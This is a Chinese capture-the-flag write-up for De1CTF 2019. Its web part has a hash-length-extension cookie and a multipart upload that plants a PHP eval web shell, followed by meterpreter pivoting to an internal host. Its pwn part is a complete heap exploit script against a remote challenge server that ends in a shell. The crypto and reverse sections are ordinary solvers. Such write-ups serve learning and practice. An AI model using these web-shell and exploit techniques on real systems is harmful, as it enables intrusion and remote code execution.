# De1CTF 2019 WP
[TOC]


## Web
### SSRFme
getSign函数好像可以用hash长度拓展，
`/De1ta?param=http://139.180.128.86 
Cookie:action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00H%01%00%00%00%00%00%00read;sign=81670763d66ae6d466304b9106550817`  
可以利用urllib.urlopen(param).read()[:50]得到网页的内容，不过只有前面一部分
`{"code": 200, "data": "#! /usr/bin/env python\r\n#encoding=utf-8\r\nfrom flas"}`

file和gopher协议都被过滤了，waf函数删除了param参数前后缀的字符，将大写变成小写，检测参数前缀是不是file和gopher

端口在:80
urlopen可以直接读文件
`De1ta?param=flag.txt
Cookie:action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read;sign=d7163f39ab78a698b3514fd465e4018a`

更新了hint：hint for [SSRF Me]: flag is in ./flag.txt


### ShellShellShell

stage1 没有做出来，但是根据源码应该存在`/upload/`目录，因此直接访问下试试，结果直接列出了所有的文件，都是别人传的一句话。随便找一个试了下几个密码，就拿到了shell（上车

拿到shell后弹一个meterpreter，shell执行`arp -a`，发现还有另外一台机器`172.18.0.2`

```
? (172.18.0.1) at 02:42:90:52:41:27 [ether] on eth0
dockerdir_getshell_1.dockerdir_default (172.18.0.2) at 02:42:ac:12:00:02 [ether] on eth0
```

`curl`一下`172.18.0.2`，发现是stage2，搜了一下是 骇极杯 2018 的原题。主要是post传数组和unlink函数的绕过，payload

```
POST / HTTP/1.1
Host: 172.18.0.2
Content-Length: 628
Cache-Control: max-age=0
Origin: http://172.18.0.2
Upgrade-Insecure-Requests: 1
DNT: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryH9Hj5Zr5i6KhmN8U
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://172.18.0.2
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

------WebKitFormBoundaryH9Hj5Zr5i6KhmN8U
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/gif

@<?php
@eval($_POST[x]);
?>
------WebKitFormBoundaryH9Hj5Zr5i6KhmN8U
Content-Disposition: form-data; name="file[1]"

fuck
------WebKitFormBoundaryH9Hj5Zr5i6KhmN8U
Content-Disposition: form-data; name="file[0]"

php/../shell.php
------WebKitFormBoundaryH9Hj5Zr5i6KhmN8U
Content-Disposition: form-data; name="hello"

./shell.php
------WebKitFormBoundaryH9Hj5Zr5i6KhmN8U
Content-Disposition: form-data; name="x"

phpinfo();
------WebKitFormBoundaryH9Hj5Zr5i6KhmN8U--

```

用reGeorg配一个socks代理，burp配上socks发包直接getshell，还是弹一个meterpreter，用`find`命令找flag

```bash
find / -type f -name "flag*"
```

然后在`/etc`下找到flag：`/etc/flag_is_He4e_89587236.txt`

cat文件拿到flag


## Crypto
### Babylfsr

常规解法
BM算法得反馈表达式
BM算法有现成的轮子，不用自己造了
给了504个，BM算法得到准确的表达式需要 2n 长度
爆破后8位即可
step back 得 initial state
```python=
import hashlib


class LFSR():
    def __init__(self, init, mask, length):
        self.init = init
        self.length = length
        self.mask = mask
        self.lengthmask = 2**(length+1)-1

    def next(self):
        nextdata = (self.init << 1) & self.lengthmask
        i = self.init & self.mask & self.lengthmask
        output = 0
        while i != 0:
            output ^= (i & 1)
            i = i >> 1
        nextdata ^= output
        self.init = nextdata
        return output

    def step_back(self):
        output = self.init & 1
        predata = self.init >> 1
        high_bit = parity(predata & self.mask) ^ output
        self.init = (high_bit << (self.length - 1)) | predata


def parity(x):
    res = 0
    while x:
        x -= x & (-x)
        res ^= 1
    return res


def Berlekamp_Massey_algorithm(sequence):
    N = len(sequence)
    s = sequence[:]

    for k in range(N):
        if s[k] == 1:
            break
    f = set([k + 1, 0])  # use a set to denote polynomial
    l = k + 1

    g = set([0])
    a = k
    b = 0

    for n in range(k + 1, N):
        d = 0
        for ele in f:
            d ^= s[ele + n - l]

        if d == 0:
            b += 1
        else:
            if 2 * l > n:
                f ^= set([a - b + ele for ele in g])
                b += 1
            else:
                temp = f.copy()
                f = set([b - a + ele for ele in f]) ^ g
                l = n + 1 - l
                g = temp
                a = b
                b = n - l + 1

    # output the polynomial
    def print_poly(polynomial):
        result = ''
        lis = sorted(polynomial, reverse=True)
        for i in lis:
            if i == 0:
                result += '1'
            else:
                result += 'x^%s' % str(i)

            if i != lis[-1]:
                result += ' + '

        return result

    return (print_poly(f), l)


def generate_mask(s, length):
    s = s.replace(' ', '')
    s = s.split('+')
    mask = 0
    for x in s:
        if 'x^' in x:
            e = int(x[2:])
            if e >= length:
                continue
            mask |= 1 << e
        elif x == '1':
            mask |= 1
    b = bin(mask)[2:].rjust(length, '0')
    return int(b[::-1], 2)


def bit_stream_to_int(a):
    return int(''.join(map(str, a)), 2)


def pad(m):
    pad_length = 8 - len(m)
    return pad_length*'0'+m


LENGTH = 256

for i in range(256):
    file = open("output", "r")
    data = file.read()
    file.close()
    result = []
    for j in range(len(data)):
        num = int(data[j], 2)
        result.append(num)
    tmp = pad(bin(i)[2:])
    for j in range(len(tmp)):
        num = int(tmp[j], 2)
        result.append(num)
    stream_z = tuple(result)
    eq, length = Berlekamp_Massey_algorithm(stream_z)
    # print("eq:", eq)
    # print("len:", length)
    if length != LENGTH:
        continue
    mask = generate_mask(eq, length)
    # print("mask:", bin(mask)[2:])
    stat = bit_stream_to_int(stream_z[:LENGTH])
    # print('stat:', bin(stat)[2:])

    if mask.bit_length() != LENGTH:
        continue
    # assert(stat.bit_length()==LENGTH)

    stream = LFSR(stat, mask, length)
    step_num = length
    for j in range(step_num):
        stream.step_back()
    res = stream.init
    for j in range(len(stream_z)):
        assert stream.next() == stream_z[length - step_num + j]

    # print("res:", bin(res)[2:])
    flag = "de1ctf{"+hashlib.sha256(hex(res)[2:].rstrip('L')).hexdigest()+"}"
    if flag[7:11] == '1224':
        print("flag:", flag)
        break

```

### xorz 

brute force
[参考](https://www.anquanke.com/post/id/161171)

### Obscured

自己实现的一个 S-box
线性分析

### mini pure

### Baby Rsa

```python=
from Crypto.Util.number import *
from gmpy2 import iroot, invert


# cal p
n = [20129615352491765499340112943188317180548761597861300847305827141510465619670536844634558246439230371658836928103063432870245707180355907194284861510906071265352409579441048101084995923962148527097370705452070577098780246282820065573711015664291991372085157016901209114191068574208680397710042842835940428451949500607613634682684113208766694028789275748528254287705759528498986306494267817198340658241873024800336013946294891687591013414935237821291805123285905335762719823771647853378892868896078424572232934360940672962436849523915563328779942134504499568866135266628078485232098208237036724121481835035731201383423, 31221650155627849964466413749414700613823841060149524451234901677160009099014018926581094879840097248543411980533066831976617023676225625067854003317018794041723612556008471579060428898117790587991055681380408263382761841625714415879087478072771968160384909919958010983669368360788505288855946124159513118847747998656422521414980295212646675850690937883764000571667574381419144372824211798018586804674824564606122592483286575800685232128273820087791811663878057827386379787882962763290066072231248814920468264741654086011072638211075445447843691049847262485759393290853117072868406861840793895816215956869523289231421, 29944537515397953361520922774124192605524711306753835303703478890414163510777460559798334313021216389356251874917792007638299225821018849648520673813786772452822809546571129816310207232883239771324122884804993418958309460009406342872173189008449237959577469114158991202433476710581356243815713762802478454390273808377430685157110095496727966308001254107517967559384019734279861840997239176254236069001453544559786063915970071130087811123912044312219535513880663913831358790376650439083660611831156205113873793106880255882114422025746986403355066996567909581710647746463994280444700922867397754748628425967488232530303, 25703437855600135215185778453583925446912731661604054184163883272265503323016295700357253105301146726667897497435532579974951478354570415554221401778536104737296154316056314039449116386494323668483749833147800557403368489542273169489080222009368903993658498263905567516798684211462607069796613434661148186901892016282065916190920443378756167250809872483501712225782004396969996983057423942607174314132598421269169722518224478248836881076484639837343079324636997145199835034833367743079935361276149990997875905313642775214486046381368619638551892292787783137622261433528915269333426768947358552919740901860982679180791]
c = [19131432661217908470262338421299691998526157790583544156741981238822158563988520225986915234570037383888112724408392918113942721994125505014727545946133307329781747600302829588248042922635714391033431930411180545085316438084317927348705241927570432757892985091396044950085462429575440060652967253845041398399648442340042970814415571904057667028157512971079384601724816308078631844480110201787343583073815186771790477712040051157180318804422120472007636722063989315320863580631330647116993819777750684150950416298085261478841177681677867236865666207391847046483954029213495373613490690687473081930148461830425717614569, 15341898433226638235160072029875733826956799982958107910250055958334922460202554924743144122170018355117452459472017133614642242411479849369061482860570279863692425621526056862808425135267608544855833358314071200687340442512856575278712986641573012456729402660597339609443771145347181268285050728925993518704899005416187250003304581230701444705157412790787027926810710998646191467130550713600765898234392350153965811595060656753711278308005193370936296124790772689433773414703645703910742193898471800081321469055211709339846392500706523670145259024267858368216902176489814789679472227343363035428541915118378163012031, 18715065071648040017967211297231106538139985087685358555650567057715550586464814763683688299037897182845007578571401359061213777645114414642903077003568155508465819628553747173244235936586812445440095450755154357646737087071605811984163416590278352605433362327949048243722556262979909488202442530307505819371594747936223835233586945423522256938701002370646382097846105014981763307729234675737702252155130837154876831885888669150418885088089324534892506199724486783446267336789872782137895552509353583305880144947714110009893134162185382309992604435664777436197587312317224862723813510974493087450281755452428746194446, 2282284561224858293138480447463319262474918847630148770112472703128549032592187797289965592615199709857879008271766433462032328498580340968871260189669707518557157836592424973257334362931639831072584824103123486522582531666152363874396482744561758133655406410364442174983227005501860927820871260711861008830120617056883514525798709601744088135999465598338635794275123149165498933580159945032363880613524921913023341209439657145962332213468573402863796920571812418200814817086234262280338221161622789516829363805084715652121739036183264026120868756523770196284142271849879003202190966150390061195469351716819539183797]

# print(crt(c, n))
m_4 = 146068806215073497344459876631371603884129554507314987227041386431864296983800292232765852493230146632246223391161616274352995602128509562953556195654254929572680238155614318159006433172894208760309766144817665852858474274746295434459658946786114485553768622540321693696983334739989582184316792317376817587284066141025953893816735983622448994863347051427279673308801466174898201800602688359956097373676655607179834345973775227535147398518523539179261883968140504230643073698857288314127486345168652339309386405706576632120711116391426300160476076254612138216623537070845645803721685414583459545099925250474009703135469241079408739336592005949980987466671054020054633554508243871664072158338203090563533576053886607251476483441992750608537110739543678599105838456537686029895264928334606913181627024815548789841726411333636163152202116487198575625907392074866811580053962217284776220330628233642351622897902940633662074194963147661868086182955886918339487179905557899816215131118989868243555958033477834658657082003718410617182774845820310639577794302769424451100567749840744304334325501306470124397022077759031911677326433654909824518845224227308515695216456907499080502091628962571645468099748573164070147303131348996440422701533681
# p = iroot(m_4, 4)[0]
p = 109935857933867829728985398563235455481120300859311421762540858762721955038310117609456763338082237907005937380873151279351831600225270995344096532750271070807051984097524900957809427861441436796934012393707770012556604479065826879107677002380580866325868240270494148512743861326447181476633546419262340100453
print("p:", p)
f = lambda m, e, n, c : pow(m, e, n) == c
assert(sum(map(f, [p]*4,[4]*4,n,c)) == 4)


# cal e1, e2
ee1 = 42
ee2 = 3
ce1 = 45722651786340123946960815003059322528810481841378247280642868553607692149509126962872583037142461398806689489141741494974836882341505234255325683219092163052843461632338442529011502378931140356111756932712822516814023166068902569458299933391973504078898958921809723346229893913662577294963528318424676803942288386430172430880307619748186863890050113934573820505570928109017842647598266634344447182347849367714564686341871007505886728393751147033556889217604647355628557502208364412269944908011305064122941446516990168924709684092200183860653173856272384
ce2 = 13908468332333567158469136439932325992349696889129103935400760239319454409539725389747059213835238373047899198211128689374049729578146875309231962936554403287882999967840346216695208424582739777034261079550395918048421086843927009452479936045850799096750074359160775182238980989229190157551197830879877097703347301072427149474991803868325769967332356950863518504965486565464059770451458557744949735282131727956056279292800694203866167270268988437389945703117070604488999247750139568614939965885211276821987586882908159585863514561191905040244967655444219603287214405014887994238259270716355378069726760953320025828158
tmp = 864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449289960707882463387
n1 = 15911581555796798614711625288508309704791837516232122410440958830726078821069050404012820896260071751380436992710638364294658173571101596931605797509712839622479368850251206419748090059752427303611760004621378226431226983665746837779056271530181865648115862947527212787824629516204832313026456390047768174765687040950636530480549014401279054346098030395100387004111574278813749630986724706263655166289586230453975953773791945408589484679371854113457758157492241225180907090235116325034822993748409011554673180494306003272836905082473475046277554085737627846557240367696214081276345071055578169299060706794192776825039
'''
i = 0
while 1:
    res = iroot(ce1 + i * n1, 3)
    if res[1]:
        print(res[0])
        break
    i = i+1
'''
result1 = 35758322488720007315168936860496618235738082907467075054912230035561498516260974955405608026498783211624583500561056065440202453598429814141803670351525306444494830423269687243634130944
root_14 = iroot(result1, 14)
# e1 = root_14[0]
e1 = 15218928658178
print("e1:", e1)
result2 = 864078778078609835167779565982540757684070450697854309005171742813414963447462554999012718960925081621571487444725528982424037419052194840720949809891134854871222612682162490991065015935449290342499311738517
# e2 = result2 - tmp
e2 = 381791429275130
print("e2:", e2)
assert(pow(e1, ee1, n1) == ce1)
assert(pow(e2 + tmp, ee2, n1) == ce2)

# cal q1p q1q
# yafu
e = 46531
n = 16278524034278364842964386062476113517067911891699789991355982121084973951738324063305190630865511554888330215827724887964565979607808294168282995825864982603759381323048907814961279012375346497781046417204954101076457350988751188332353062731641153547102721113593787978587135707313755661153376485647168543680503160420091693269984008764444291289486805840439906620313162344057956594836197521501755378387944609246120662335790110901623740990451586621846212047950084207251595169141015645449217847180683357626383565631317253913942886396494396189837432429078251573229378917400841832190737518763297323901586866664595327850603
c = 14992132140996160330967307558503117255626925777426611978518339050671013041490724616892634911030918360867974894371539160853827180596100892180735770688723270765387697604426715670445270819626709364566478781273676115921657967761494619448095207169386364541164659123273236874649888236433399127407801843412677293516986398190165291102109310458304626261648346825196743539220198199366711858135271877662410355585767124059539217274691606825103355310348607611233052725805236763220343249873849646219850954945346791015858261715967952461021650307307454434510851869862964236227932964442289459508441345652423088404453536608812799355469
q1q = 127587319253436643569312142058559706815497211661083866592534217079310497260365307426095661281103710042392775453866174657404985539066741684196020137840472950102380232067786400322600902938984916355631714439668326671310160916766472897536055371474076089779472372913037040153356437528808922911484049460342088835693
q1p = 127587319253436643569312142058559706815497211661083866592534217079310497260365307426095661281103710042392775453866174657404985539066741684196020137840472950102380232067786400322600902938984916355631714439668326671310160916766472897536055371474076089779472372913037040153356437528808922911484049460342088834871
phi_n = (q1p - 1) * (q1q - 1)
d = inverse(e, phi_n)
hint = pow(c, d, n)
assert(q1p*q1q == n)
assert(q1p < q1q)
assert(c == pow(hint, e, n))
print(long_to_bytes(hint))

# cal flag
# c1==pow(flag,e1,p*q1)
q1 = q1p
# zai? genxintimufujianweishenmebugaitimumiaoshu?
print("q1:", q1)
c1 = 262739975753930281690942784321252339035906196846340713237510382364557685379543498765074448825799342194332681181129770046075018122033421983227887719610112028230603166527303021036386350781414447347150383783816869784006598225583375458609586450854602862569022571672049158809874763812834044257419199631217527367046624888837755311215081173386523806086783266198390289097231168172692326653657393522561741947951887577156666663584249108899327053951891486355179939770150550995812478327735917006194574412518819299303783243886962455399783601229227718787081785391010424030509937403600351414176138124705168002288620664809270046124
c2 = 7395591129228876649030819616685821899204832684995757724924450812977470787822266387122334722132760470911599176362617225218345404468270014548817267727669872896838106451520392806497466576907063295603746660003188440170919490157250829308173310715318925771643105064882620746171266499859049038016902162599261409050907140823352990750298239508355767238575709803167676810456559665476121149766947851911064706646506705397091626648713684511780456955453552020460909638016134124590438425738826828694773960514221910109473941451471431637903182205738738109429736425025621308300895473186381826756650667842656050416299166317372707709596
n1 = p * q1
phi_n1 = (p - 1) * (q1 - 1)
# d1 = inverse(e1, phi_n1)
gcd = GCD(e1, phi_n1)
print(gcd)
e11 = e1 // gcd
d1 = inverse(e11, phi_n1)
# print(d1)
flag = pow(c1, d1, n1)
print(flag)
print(iroot(flag, gcd))
```
上面是没更新题目附件前的错误解法
已知 q2，可以将题目最后一步等价转换为

$$
c = m^e \bmod q_1q_2 \\
e = 2 \times 7\\
2 \times 7 \times d \equiv 1 \bmod q_1q_2 \\
m^2 \equiv c^{2d} \bmod q_1q_2
$$
```python=
# -*- coding: utf-8 -*-
from libnum import *
import gmpy2
import binascii

n1=14026421403608850538141941134415123035480821260009023272852227652294369768924720291551825022558508921757069810168890210659300751295687984464120361603484833107577707315224200403339123705080662081124649850471437668432668197155974027856045895862308752890863020992893033975618443538833093806853316798879069845032846099239352530102130854225894044433205494627226602665246262610014754843077273764332616103606390253327847657024830124568121449707939003751581246773145979850504925251769934858453288258836211370560720776252120899603829089144893266170533079846352980690655296166956048356641441278306805708641768401632907869296563
e1=15218928658178
c1=262739975753930281690942784321252339035906196846340713237510382364557685379543498765074448825799342194332681181129770046075018122033421983227887719610112028230603166527303021036386350781414447347150383783816869784006598225583375458609586450854602862569022571672049158809874763812834044257419199631217527367046624888837755311215081173386523806086783266198390289097231168172692326653657393522561741947951887577156666663584249108899327053951891486355179939770150550995812478327735917006194574412518819299303783243886962455399783601229227718787081785391010424030509937403600351414176138124705168002288620664809270046124
n2=12576792776441868460310572815146451609710311695984515013558509834553696852030254594714717427505324619783646995504683017031430503251727424977270099766908118039524712994568784099773764327225120528130278473073742198967400528250987803575307471546287327562076124032002936490921586914802573138357476317249358454751787894066797713393834208559291953018425313576230252414540385038376890603123100209352811026402147216926308215475564027141208525623572834121056219417040958454299811932843083540891553556881719878357418755035656335377899194671137027062474926281155733841916601543675928364926426700944109451996871536142970918959389
e2=381791429275130
c2=7395591129228876649030819616685821899204832684995757724924450812977470787822266387122334722132760470911599176362617225218345404468270014548817267727669872896838106451520392806497466576907063295603746660003188440170919490157250829308173310715318925771643105064882620746171266499859049038016902162599261409050907140823352990750298239508355767238575709803167676810456559665476121149766947851911064706646506705397091626648713684511780456955453552020460909638016134124590438425738826828694773960514221910109473941451471431637903182205738738109429736425025621308300895473186381826756650667842656050416299166317372707709596


p=gcd(n1,n2)
#print (p)
q1=127587319253436643569312142058559706815497211661083866592534217079310497260365307426095661281103710042392775453866174657404985539066741684196020137840472950102380232067786400322600902938984916355631714439668326671310160916766472897536055371474076089779472372913037040153356437528808922911484049460342088834871
q2 =  114401188227479584680884046151299704656920536168767132916589182357583461053336386996123783294932566567773695426689447410311969456458574731187512974868297092638677515283584994416382872450167046416573472658841627690987228528798356894803559278308702635288537653192098514966089168123710854679638671424978221959513
assert(p*q1==n1)
assert(p*q2==n2)
f1=(p-1)*(q1-1)
f2=(p-1)*(q2-1)
tmp=14

e1=e1/tmp
e2=e2/tmp
bd1=invmod(e1,f1)
bd2=invmod(e2,f2)

m1=pow(c1,bd1,n1)
m2=pow(c2,bd2,n2)
m3=m1%p
m2=m2%q2
m1=m1%q1

m=solve_crt([m1,m2,m3], [q1,q2,p]) 
#print (m)
n=q1*q2
f=(q1-1)*(q2-1)
m=m%n
td=invmod(7,f)
m=pow(m,td,n)
res1 = gmpy2.iroot(m,2)[0]
res2 = hex(res1)[2:]
print (binascii.a2b_hex(res2))
```
运行脚本即可得flag

## Reverse

### Re_Sign


1. `v = base64 (input)`

2. `check (v) => [(base64charset.index(char) + 1) for x in v] == res` 

> base64 的表可由调试得出，输入字符串调试结果与标准base64 结果比较可得表。

```python=
import base64

cset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='

# table_ 由调试得出
table_ = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', 'A', 'S', 
'D', 'F', 'G', 'H', 'J', 'K', 'L', 'Z', 'X', 0, 'V', 'B', 'N', 'M', 'q', 'w', 'e', 'r', 0, 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm', 0, 0, '=']

# 有一部分缺失，这里只是猜测
# ['C', 't', '+', '/']
fake_table = []
for x in cset:
    if x not in table_:
        fake_table.append(x)
print(fake_table)

off = 0
for i in range(len(table_)):
    if table_[i] == 0:
        table_[i] = fake_table[off]
        off += 1

res = [8, 59, 1, 32, 7, 52, 9, 31, 24, 36, 19, 3, 16, 56, 9, 27, 8, 52, 19, 2, 8, 34, 18, 3, 5, 6, 18, 3, 15, 34, 18, 23, 8, 1, 41, 34, 6, 36, 50, 36, 15, 31, 43, 36, 3, 21, 65, 65]
b64flag = ''
for i in res:
    b64flag += cset[i - 1]
print(b64flag)
# H6AfGzIeXjSCP3IaHzSBHhRCEFRCOhRWHAohFjxjOeqjCU==

rawb64 = ''
for i in range(0x30):
    rawb64 += cset[table_.index(b64flag[i])]
print(rawb64)
# ZGUxY3Rme0VfTDRuZ3VhZzNfMXNfSzNLZUszX040Smk0fQ==

print(base64.b64decode(rawb64.encode()))
```

### c_plus_plus

输入格式为 `word1@word2#word3`
程序依次检验三段密码的正确性，并且每段密码的范围为 0 ~ 0x1999，故可爆破。


```python=
word1 = 78

word2 = 20637

word3 = 114
```


## PWN
### weapon
构造堆重叠，得到unsorted bin，然后覆盖main_area+88的低位到IO_stdout附近合法size（需要爆破，概率1/16），然后改stdout的flags和io_write_base造成leak，从而malloc_hook,onegadget.

```#coding=utf8

from pwn import *

context.log_level = 'debug'

context.terminal = ['gnome-terminal','-x','bash','-c']

context.binary='./pwn'

libc=ELF('/lib/x86_64-linux-gnu/./libc.so.6')

def add(idx, size, content):

	r.recvuntil('choice >> ')

	r.sendline('1')

	r.recvuntil('wlecome input your size of weapon: ')

	r.sendline(str(size))

	r.recvuntil('input index: ')

	r.sendline(str(idx))

	r.recvuntil('input your name:\n')

	r.send(content)



def free(idx):

	r.recvuntil('choice >> ')

	r.sendline('2')

	r.recvuntil('input idx :')

	r.sendline(str(idx))



def edit(idx,content):

	r.recvuntil('choice >> ')

	r.sendline('3')

    	r.recvuntil('input idx: ')

	r.sendline(str(idx))

	r.recvuntil('new content:\n')

	r.send(content)

for _ in range(16):

	try:

		r=remote('139.180.216.34',8888)

		add(0, 0x60,p64(0)+p64(0x71))

		add(1, 0x60,'a')

		add(2,0x60,'b')

		add(3,0x60,'c')

		free(0)

		free(1)

		edit(1,'\x10')

		add(1,0x60,'d')

		add(4,0x60,'e')   #unsorted bin

		edit(0,p64(0)+p64(0x141))

		free(4)

		free(2)

		free(0)

		free(1)

		add(5,0x58,'f')

		edit(4,p64(0)*11+p64(0x71))

		edit(1,'\xdd\x25')

		add(6,0x60,'g')

		#gdb.attach(r)

		add(7,0x60,'h')

		payload = p64(0)*6+'\x00'*3+p64(0x00fbad2887|0x800|0x1000)+p64(0)*3+'\x88'

		#gdb.attach(r)

		edit(7,payload)

		x = r.recvuntil('Done')[:8]

		libc.addr = u64(x)-0x7ffff7dd18e0+0x7ffff7a0d000

		one_gadget = 0xf02a4 + libc.addr 

		malloc_hook = 0x3c4b10 + libc.addr

		print(hex(libc.addr))

		free(0)

		free(1)

		edit(1, p64(malloc_hook-0x23))

		add(8,0x60,'i')

		add(9,0x60,'a'*0x13+p64(one_gadget))

		print(hex(one_gadget))

		free(0)

		free(0)

		r.sendline('cat flag')

		r.interactive()

	except:

		pass

```




